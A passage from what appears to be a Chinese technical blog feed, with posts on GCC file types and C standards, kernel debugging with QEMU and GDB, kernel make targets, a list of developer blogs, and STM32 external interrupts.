程序时各类文件扩展名的释义：</p><table><thead><tr><th>后缀名称</th><th>描述内容</th></tr></thead><tbody><tr><td><code>.c</code></td><td>C 语言源码，必须经过预处理。</td></tr><tr><td><code>.C</code>、<code>.cc</code>、<code>.cxx</code></td><td>C++源代码，必须经过预处理。</td></tr><tr><td><code>.h</code></td><td>C&#x2F;C++语言源代码的头文件。</td></tr><tr><td><code>.i</code></td><td>由<code>.c</code>文件预处理后生成。</td></tr><tr><td><code>.ii</code></td><td>由<code>.C</code>、<code>.cc</code>、<code>.cxx</code>源码预处理后生成。</td></tr><tr><td><code>.s</code></td><td>汇编语言文件，是<code>.i</code>文件编译后得到的中间文件。</td></tr><tr><td><code>.o</code></td><td>目标文件，是编译过程得到的中间文件。</td></tr><tr><td><code>.a</code></td><td>由目标文件构成的文件库，也称为<strong>静态库</strong>。</td></tr><tr><td><code>.so</code></td><td>共享对象库，也称为<strong>动态库</strong>。</td></tr></tbody></table><h2 id="指定编译规范"><a href="#指定编译规范" class="headerlink" title="指定编译规范"></a>指定编译规范</h2><p>由于 GCC 同时支持多套 C 程序语言规范，因而编译时可以通过选项指定当前需要遵循的语言规范，具体请参考下表：</p><table><thead><tr><th>规范</th><th>规范</th><th>选项</th><th>补充</th></tr></thead><tbody><tr><td>C89 &#x2F; C90</td><td>ANSI C (X3.159-1989) 或 ISO&#x2F;IEC 9899:1990</td><td><code>-std=c90</code></td><td><code>-std=iso9899:1990</code>、<code>-ansi</code></td></tr><tr><td>C94 &#x2F; C95</td><td>95 年发布的 C89&#x2F;C90 修正版，此次修正通常称作 AMD1</td><td>-</td><td><code>-std=iso9899:199409</code></td></tr><tr><td>C99</td><td>ISO&#x2F;IEC 9899:1999</td><td><code>-std=c99</code></td><td><code>-std=iso9899:1999</code></td></tr><tr><td>C11</td><td>ISO&#x2F;IEC 9899:2011</td><td><code>-std=c11</code></td><td><code>-std=iso9899:2011</code></td></tr><tr><td>GNU C89 &#x2F; C90</td><td>带 GNU 扩展的 C89&#x2F;C90</td><td><code>-std=gnu90</code></td><td>-</td></tr><tr><td>GNU C99</td><td>带 GNU 扩展的 C99</td><td><code>-std=gnu99</code></td><td>-</td></tr><tr><td>GNU C11</td><td>带 GNU 扩展的 C11</td><td><code>-std=gnu11</code></td><td>-</td></tr></tbody></table><p>例如下面代码当中，指定了 GCC 的编译过程遵循 C89&#x2F;C90 规范，结果编译时提示错误信息：<code>C++ style comments are not allowed in ISO C90</code>。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span>➜  gcc main.c -std=c90</span><br><span></span><br><span>main.c: In <span>function</span> ‘main’:</span><br><span>main.c:7:36: error: C++ style comments are not allowed <span>in</span> ISO C90</span><br><span>     <span>printf</span>(<span>"hello world!\n"</span>);      // 行注释</span><br><span>                                    ^</span><br><span>main.c:7:36: error: (this will be reported only once per input file)</span><br></pre></td></tr></tbody></table><blockquote><p>缺省情况下，GCC 默认使用的是<code>-std=gnu11</code>规范，即携带 GNU 扩展的 C11 标准。</p></blockquote><h2 id="参数选择"><a href="#参数选择" class="headerlink" title="参数选择"></a>参数选择</h2><pre><code class="hljs">-symbols &lt;file&gt;-s &lt;file&gt;从指定文件中读取符号表。-se file从指定文件中读取符号表信息，并把他用在可执行文件中。-core &lt;file&gt;-c &lt;file&gt;调试时core dump的core文件。-directory &lt;directory&gt;-d &lt;directory&gt;加入一个源文件的搜索路径。默认搜索路径是环境变量中PATH所定义的路径。</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p><a href="https://sourceware.org/gdb/current/onlinedocs/gdb.html/TUI-Commands.html">https://sourceware.org/gdb/current/onlinedocs/gdb.html/TUI-Commands.html</a></p></li><li><p><a href="https://www.kancloud.cn/wizardforcel/gdb-tips-100/146735">https://www.kancloud.cn/wizardforcel/gdb-tips-100/146735</a></p></li><li><p><a href="https://brezezee.github.io/2021/06/10/tricks%20and%20tools/gdb/">https://brezezee.github.io/2021/06/10/tricks%20and%20tools/gdb/</a></p></li><li><p><a href="https://c.biancheng.net/view/8219.html">https://c.biancheng.net/view/8219.html</a></p></li><li><p><a href="https://www.eecs.umich.edu/courses/eecs373/readings/Debugger.pdf">https://www.eecs.umich.edu/courses/eecs373/readings/Debugger.pdf</a></p></li><li><p><a href="https://quickref.me/zh-CN/docs/gdb.html">https://quickref.me/zh-CN/docs/gdb.html</a></p></li><li><p><a href="https://ivanzz1001.github.io/records/post/cplusplus/2018/11/09/cpluscplus-gdbusage_part5#2-%E6%BA%90%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE">https://ivanzz1001.github.io/records/post/cplusplus/2018/11/09/cpluscplus-gdbusage_part5#2-%E6%BA%90%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE</a></p></li><li><p><a href="https://firmianay.gitbook.io/ctf-all-in-one/2_tools/dong-tai-fen-xi-gong-ju/2.3.1_gdb#gdb-peda">https://firmianay.gitbook.io/ctf-all-in-one/2_tools/dong-tai-fen-xi-gong-ju/2.3.1_gdb#gdb-peda</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>GDB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用GDB调试Linux内核</title>
    <link href="/2023/11/21/%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95Linux%E5%86%85%E6%A0%B8/"/>
    <url>/2023/11/21/%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95Linux%E5%86%85%E6%A0%B8/</url>
    
    <content type="html"><![CDATA[<p>如何使用GDB调试Linux内核</p><span id="more"></span><h1 id="编译Linux内核"><a href="#编译Linux内核" class="headerlink" title="编译Linux内核"></a>编译Linux内核</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> ARCH=x86<br><br>make menuconfig <span class="hljs-comment">#首先进行配置</span><br><br>make -j 8 <span class="hljs-comment">#使用8个cpu进行编译</span><br><span class="hljs-comment"># 在这一步之后，Linux会在./linux-5.0/arch/x86/boot/目录下生成bgimg文件。</span><br></code></pre></td></tr></table></figure><p>在menuconfig中配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Kernel hacking  ---&gt; <br>    [*] Kernel debugging<br>    Compile-time checks and compiler options  ---&gt;<br>        [*] Compile the kernel with debug info<br>        [*]   Provide GDB scripts <span class="hljs-keyword">for</span> kernel debuggin<br><br><br>Processor <span class="hljs-built_in">type</span> and features ----&gt;<br>    [] Randomize the address of the kernel image (KASLR)<br></code></pre></td></tr></table></figure><h1 id="安装qume"><a href="#安装qume" class="headerlink" title="安装qume"></a>安装qume</h1><ol><li>下载好qemu后，.&#x2F;configure prefix&#x3D;&#x2F;to&#x2F;path&#x2F; 配置好安装路径</li><li>make 编译</li></ol><h1 id="制作根目录"><a href="#制作根目录" class="headerlink" title="制作根目录"></a>制作根目录</h1><p><strong>一个最小的Linux系统需要img文件和一个根目录</strong>，制作根目录有很多软件，我们使用busybox。</p><p>步骤：</p><ol><li><p>使用dd命令创建文件，并格式化为ext4文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">szp@r420-PowerEdge-R420:~/busybox-1.32.0$ <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=rootfs.img bs=1M count=10<br><br>szp@r420-PowerEdge-R420:~/busybox-1.32.0$ mkfs.ext4 rootfs.img<br></code></pre></td></tr></table></figure></li><li><p>创建用于挂载该镜像文件的目录fs，挂载后才能往里面写入busybox。 使用mount命令将rootfs.img挂载到fs目录，编译busybox并写入fs目录中。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">szp@r420-PowerEdge-R420:~$ <span class="hljs-built_in">mkdir</span> fs<br><br>szp@r420-PowerEdge-R420:~/busybox-1.32.0$ sudo mount -t ext4 -o loop rootfs.img ./fs<br><br>szp@r420-PowerEdge-R420:~/busybox-1.32.0$ sudo make install CONFIG_PREFIX=./fs<br></code></pre></td></tr></table></figure><ol start="3"><li>接下来对写入的busybox进行补充配置：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">szp@r420-PowerEdge-R420:~/busybox-1.32.0/fs$ sudo <span class="hljs-built_in">mkdir</span> proc dev etc home mnt<br><br>szp@r420-PowerEdge-R420:~/busybox-1.32.0/fs$ sudo <span class="hljs-built_in">cp</span> -r ../examples/bootfloppy/etc/* etc/<br><br>szp@r420-PowerEdge-R420:~/busybox-1.32.0$ sudo <span class="hljs-built_in">chmod</span> -R 777 fs/ <br><br></code></pre></td></tr></table></figure><ol start="4"><li>最后，卸载rootfs.img：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">szp@r420-PowerEdge-R420:~/busybox-1.32.0$ sudo umount fs<br></code></pre></td></tr></table></figure><p>至此已经制作好了根文件目录，下面我们启动qemu</p><h1 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">szp@r420-PowerEdge-R420:~$ qemu-system-x86_64 -kernel ~/linux-4.14.191/arch/x86_64/boot/bzImage  -hda ~/busybox-1.32.0/rootfs.img  -append <span class="hljs-string">&quot;root=/dev/sda console=ttyS0&quot;</span> -s -S  -smp 1 -nographic<br></code></pre></td></tr></table></figure><p>该命令的参数注释：</p><ul><li><p>-kernel # 指定编译好的内核镜像</p></li><li><p>-hda # 指定硬盘</p></li><li><p>-append “root&#x3D;&#x2F;dev&#x2F;sda” 指示根文件系统 console&#x3D;ttyS0 把QEMU的输入输出定向到当前终端上</p></li><li><p>-nographic 不使用图形输出窗口</p></li><li><p>-s 是-gdb tcp::1234缩写，监听1234端口，在GDB中可以通过target remote localhost:1234连接 **使用<code>-gdb tcp:xxxx</code>命令可以更换端口。</p></li></ul><p>至此我们已经完成了大部分操作只需要，新启动一个shell，然后执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb ./linux-5.0/vmlinux <br><br><span class="hljs-comment">#开启gdb之后输入：</span><br><br>target remote localhost :1234 <span class="hljs-comment">#特别注意这里:之前的空格是一定需要的。</span><br></code></pre></td></tr></table></figure><p>查看gdb支持的lx函数或命令：apropos lx</p><p>vmlinux 是编译内核时生成的调试文件，在内核源码的根目录中。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://kerneltravel.net/blog/2021/debug_kernel_szp/">http://kerneltravel.net/blog/2021/debug_kernel_szp/</a></p><p><a href="https://mazhen.tech/p/%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E">https://mazhen.tech/p/%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E</a></p><p><a href="https://howardlau.me/programming/debugging-linux-kernel-with-vscode-qemu.html#_VSCode">使用vscode+qemu+gdb调试Linux内核</a></p><h1 id="直接使用物理机进行调试"><a href="#直接使用物理机进行调试" class="headerlink" title="直接使用物理机进行调试"></a>直接使用物理机进行调试</h1><p>除开使用虚拟机安装内核后，还可以直接在平台上通过安装内核调试符号包来进行调试。</p><h2 id="查询系统的版本"><a href="#查询系统的版本" class="headerlink" title="查询系统的版本"></a>查询系统的版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r <span class="hljs-comment">#查看系统版本</span><br></code></pre></td></tr></table></figure><h2 id="下载调试包"><a href="#下载调试包" class="headerlink" title="下载调试包"></a>下载调试包</h2><p>已知自己的版本通过这个版本号去这个网站下载调试包，注意的是下载的调试包需要和自己的系统版本对应<a href="https://launchpad.net/ubuntu/+source/linux-hwe-5.13">Ubuntu官方网站下的调试包</a></p><p>linux-image-unsigned-5.13.0-52-generic-dbgsym_5.13.0-52.59~20.04.1_amd64.ddeb 这是我的系统对应的版本。</p><h2 id="安装内核源码"><a href="#安装内核源码" class="headerlink" title="安装内核源码"></a>安装内核源码</h2><blockquote><p>这里需要注意的是：amd64就是x86-64也称之intel64</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-cache search linux-source<br>linux-source - Linux kernel <span class="hljs-built_in">source</span> with Ubuntu patches<br>linux-source-5.13.0 - Linux kernel <span class="hljs-built_in">source</span> <span class="hljs-keyword">for</span> version 5.13.0 with Ubuntu patches<br><br>$ sudo apt install linux-source-5.13.0<br>$ sudo <span class="hljs-built_in">cd</span> /usr/src<br>$ sudo tar -jxvf linux-source-5.13.0.tar.bz2<br>$ sudo <span class="hljs-built_in">cd</span> /usr/src/linux-source-5.13.0<br></code></pre></td></tr></table></figure><p>创建软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 需要 gdb 首先获取到 vmlinux-5.13.0-20-generic 的编译目录，使用 list *__x64_sys_mount</span><br><span class="hljs-comment"># 会提示对应的编译目录，如果我们在 /usr/src 目录已经安装了源码，建立快捷方式即可</span><br>$ <span class="hljs-built_in">mkdir</span> -p /build/linux-lpF6wX/<br>$ <span class="hljs-built_in">ln</span> -s /usr/src/linux-source-5.13.0 /build/linux-lpF6wX/linux-5.13.0 <br></code></pre></td></tr></table></figure><h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb /usr/lib/debug/boot/vmlinux-5.13.0-20-generic<br>(gdb) list *__x64_sys_mount<br>0xffffffff81352ce0 is <span class="hljs-keyword">in</span> __x64_sys_mount (/build/linux-lpF6wX/linux-5.13.0/fs/namespace.c:3451).<br>warning: Source file is more recent than executable.<br>3446/* ... and <span class="hljs-built_in">return</span> the root of (sub)tree on it */<br>3447<span class="hljs-built_in">return</span> path.dentry;<br>3448&#125;<br>3449EXPORT_SYMBOL(mount_subtree);<br>3450<br>3451SYSCALL_DEFINE5(mount, char __user *, dev_name, char __user *, dir_name,<br>3452char __user *, <span class="hljs-built_in">type</span>, unsigned long, flags, void __user *, data)<br>3453&#123;<br>3454int ret;<br>3455char *kernel_type;<br><br>(gdb) disassemble *__x64_sys_mount<br>...<br>   0xffffffff81352de3 &lt;+259&gt;:call   0xffffffff813524c0 &lt;path_mount&gt;<br>   0xffffffff81352de8 &lt;+264&gt;:lea    -0x40(%rbp),%rdi<br>   0xffffffff81352dec &lt;+268&gt;:movslq %eax,%r12<br>   0xffffffff81352def &lt;+271&gt;:call   0xffffffff813321b0 &lt;path_put&gt;<br>...<br></code></pre></td></tr></table></figure><p>通过在 gdb 工作窗口中 <code>list *__x64_sys_mount </code>我们就可以看到源码相关的定义，一切准备完成，可以愉快地进行相关工作调试了。</p><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://advdbg.org/blogs/advdbg_system/articles/7147.aspx">http://advdbg.org/blogs/advdbg_system/articles/7147.aspx</a></p><p><a href="https://www.ebpf.top/post/ubuntu-21-10-dbgsym/">https://www.ebpf.top/post/ubuntu-21-10-dbgsym/</a></p><p><a href="https://blog.csdn.net/qq_30952829/article/details/126571506">https://blog.csdn.net/qq_30952829/article/details/126571506</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核编译make命令的参数汇总</title>
    <link href="/2023/11/21/Linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91make%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8F%82%E6%95%B0%E6%B1%87%E6%80%BB/"/>
    <url>/2023/11/21/Linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91make%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8F%82%E6%95%B0%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>Linux内核编译make命令的参数记录</p><span id="more"></span><h1 id="清理目标"><a href="#清理目标" class="headerlink" title="清理目标"></a>清理目标</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$make</span> clean—— 删除大多数生成的文件，但保留配置和足够的构建支持以构建外部模块<br><span class="hljs-variable">$make</span> mrproper —— 删除所有生成的文件+ config +各种备份文件<br><span class="hljs-variable">$make</span> distclean —— <span class="hljs-variable">$make</span> mrproper +删除编辑器备份文件和补丁文件<br></code></pre></td></tr></table></figure><h1 id="配置目标"><a href="#配置目标" class="headerlink" title="配置目标"></a>配置目标</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#手动配置</span><br>$ make [ARCH=xxx] config——基于文本的配置界面<br>$ maken[ARCH=xxx] nconfig——基于ncurses的配置界面<br>$ maken[ARCH=xxx] menuconfig——基于菜单程序的配置界面<br>$ maken[ARCH=xxx] xconfig——使用基于Qt的配置界面<br>$ maken[ARCH=xxx] gconfig——使用基于GTK+的配置界面<br><br><span class="hljs-comment">#快速配置</span><br>$ maken[ARCH=xxx] oldconfig——使用之前配置好的.config作为基础更新当前配置<br><br>$ maken[ARCH=xxx] localmodconfig——更新当前配置禁用未加载的模块<br><br>$ maken[ARCH=xxx] localyesconfig——更新当前配置并将模块转为内核改为内核内建<br><br>$ maken[ARCH=xxx] deconfig——使用ARCH提供的defconfig默认配置<br><br>$ maken[ARCH=xxx] savedefconfig——将当前系统的内核配置保存为./defconfig（最小配置）<br><br>$ maken[ARCH=xxx] allnoconfig——新配置，其中所有选项均设置为no<br><br>$ maken[ARCH=xxx] allyesconfig——新配置，其中所有选项均设置为<span class="hljs-built_in">yes</span><br><br>$ maken[ARCH=xxx] allmodconfig——新配置，其中所有选项均尽可能设置为module<br><br>$ maken[ARCH=xxx] alldefconfig——新配置，其中所有选项均设置为默认值<br><br>$ maken[ARCH=xxx] randconfig——新配置，其中所有选项均设置为随机值<br><br>$ maken[ARCH=xxx] listnewconfig——列出新选项<br><br>$ maken[ARCH=xxx] olddefconfig——与oldconfig相同，但在没有提示的情况下将新符号设置为其默认值<br><br>$ maken[ARCH=xxx] kvmconfig——为kvm来宾内核支持启用其他选项<br><br>$ maken[ARCH=xxx] xenconfig——为xen dom0和来宾内核支持启用其他选项<br><br>$ maken[ARCH=xxx] tinyconfig——配置最小的内核<br></code></pre></td></tr></table></figure><p>a</p><h1 id="make-命令总结"><a href="#make-命令总结" class="headerlink" title="make 命令总结"></a>make 命令总结</h1><h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-q <span class="hljs-comment"># 使用安静模式</span><br>-f <span class="hljs-comment"># 指定Makefile文件</span><br>-d <span class="hljs-comment"># 显示全部调试信息</span><br>-C <span class="hljs-comment"># 更改指定目录，使用其他文件夹下的Makefile文件</span><br>-B <span class="hljs-comment"># 强制重新执行Makefile</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>内核</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>优秀开发者博客汇总</title>
    <link href="/2023/11/21/%E4%BC%98%E7%A7%80%E5%BC%80%E5%8F%91%E8%80%85%E5%8D%9A%E5%AE%A2%E6%B1%87%E6%80%BB/"/>
    <url>/2023/11/21/%E4%BC%98%E7%A7%80%E5%BC%80%E5%8F%91%E8%80%85%E5%8D%9A%E5%AE%A2%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>优秀网站、博客收集</p><span id="more"></span><h1 id="计算机系统"><a href="#计算机系统" class="headerlink" title="计算机系统"></a>计算机系统</h1><p><a href="https://csstormq.github.io/">https://csstormq.github.io/</a></p><h1 id="计算机实验"><a href="#计算机实验" class="headerlink" title="计算机实验"></a>计算机实验</h1><p><a href="https://rcore-os.cn/rCore_tutorial_doc/chapter2/part4.html">清华大学的操作系统实验rcore</a></p><p><a href="https://howardlau.me/category/university/ucore">个人实现ucore的博客</a></p><h1 id="单片机"><a href="#单片机" class="headerlink" title="单片机"></a>单片机</h1><p><a href="https://lonlypan.com/2022/05/08/%E4%B9%90%E9%91%ABESP32%20S2%E6%95%99%E7%A8%8B_%E5%9F%BA%E4%BA%8EESP-IDF%20v4.4/#S2-%E7%A1%AC%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">esp单片机教程</a></p><p><a href="https://blog.csdn.net/qq_28576837?type=blog">单片机</a></p><p><a href="https://blog.csdn.net/qq_28576837/article/details/125656826?spm=1001.2014.3001.5502">单片机，同上</a></p><h1 id="Linux工具使用"><a href="#Linux工具使用" class="headerlink" title="Linux工具使用"></a>Linux工具使用</h1><p><a href="https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/index.html">常见的Linux工具汇总</a></p><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><p><a href="https://cs.pynote.net/sf/202111035/">https://cs.pynote.net/sf/202111035/</a></p><h1 id="Linux教程"><a href="#Linux教程" class="headerlink" title="Linux教程"></a>Linux教程</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTc0ODAzMw==&mid=2247502070&idx=1&sn=5d7a95ae3d27d1cfa6af5f1357de4e77&source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg2OTc0ODAzMw==&amp;mid=2247502070&amp;idx=1&amp;sn=5d7a95ae3d27d1cfa6af5f1357de4e77&amp;source=41#wechat_redirect</a></p><p><a href="https://sunocean.life/blog/blog/2021/11/20/windows-program#%E7%B1%BB">https://sunocean.life/blog/blog/2021/11/20/windows-program#%E7%B1%BB</a></p><h1 id="vim相关"><a href="#vim相关" class="headerlink" title="vim相关"></a>vim相关</h1><ul><li>[使用vim写LaTEX文档]</li><li><a href="https://harttle.land/#">关于vim的使用以及C++</a></li></ul><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><ul><li><a href="https://juejin.cn/post/7187076436644069433">jyy os笔记</a></li></ul><h1 id="电子"><a href="#电子" class="headerlink" title="电子"></a>电子</h1><p><a href="http://www.uinio.com/">http://www.uinio.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EXTI的作用</title>
    <link href="/2023/11/21/EXTI%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2023/11/21/EXTI%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>EXTI片上外设</p><span id="more"></span><h1 id="EXTI简介"><a href="#EXTI简介" class="headerlink" title="EXTI简介"></a>EXTI简介</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402112149239.png"></p><p>EXTI中文名字是外部中断，检测指定的引脚的电平的变化，一旦发生了电平变化，EXTI则会产生中断，这个中断会传送到NVIC哪里去。NVIC是stm32中断的管理设备。</p><h2 id="EXTI的物理结构"><a href="#EXTI的物理结构" class="headerlink" title="EXTI的物理结构"></a>EXTI的物理结构</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311181941566.png"></p><p>由以上图可以看出EXTI如何使用，首先通过GPIO来输出信号，通过AFIO来选择一个信号并且将其输出至EXTI，交由EXTI同一管理。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402112210316.png"></p><h1 id="AFIO的作用"><a href="#AFIO的作用" class="headerlink" title="AFIO的作用"></a>AFIO的作用</h1><ol><li>AFIO主要用于引脚复用功能的选择和重定义</li><li>在STM32中，AFIO主要完成两个任务：复用功能引脚重映射、中断引脚选择</li></ol><p>结构框图：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402112154241.png"></p><h2 id="AFIO相关函数"><a href="#AFIO相关函数" class="headerlink" title="AFIO相关函数"></a>AFIO相关函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">GPIO_EventOutputConfig</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> GPIO_PortSource, <span class="hljs-type">uint8_t</span> GPIO_PinSource)</span>;<span class="hljs-comment">//配置AFIO输出事件信号，而不是</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">GPIO_EventOutputCmd</span><span class="hljs-params">(FunctionalState NewState)</span>;<span class="hljs-comment">//使能中断事件信号</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">GPIO_PinRemapConfig</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> GPIO_Remap, FunctionalState NewState)</span>;<span class="hljs-comment">//AFIO引脚重映射</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">GPIO_EXTILineConfig</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> GPIO_PortSource, <span class="hljs-type">uint8_t</span> GPIO_PinSource)</span>;<span class="hljs-comment">//选择EXTI所连接的中断线，实际上就是上面有颜色框图的最左边</span><br></code></pre></td></tr></table></figure><h1 id="EXTI的作用"><a href="#EXTI的作用" class="headerlink" title="EXTI的作用"></a>EXTI的作用</h1><p>会向NVIC申请中断，通过NVIC的裁决后，判断是否中断，如何中断。<strong>所以EXTI的作用是检测作用。当有指定的情况发生时，EXTI会产生中断信号发送至NVIC</strong></p><p>同时，EXTI不仅仅可以产生中断信号。还可以产生一个事件信号。事件信号就是不在通知cpu，而是去通知一个外设。这个事件信号就是外设之间的协调配合所使用的。而中断信号就是去通知cpu的。</p><p>下面是EXTI的内部结构图<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311181955954.png"></p><p>怎么看这个结构图：</p><ul><li>箭头、线上面的20表示有一样的20根线</li></ul><p>产生中断线路目的是把输入信号输入到NVIC，进一步会运行中断服务函数，实现功能，这样是软件级的。而产生事件线路目的就是传输一个脉冲信号给其他外设使用， 并且是电路级别的信号传输，属于硬件级的。</p><h1 id="EXTI和NVIC片上外设之间的关系"><a 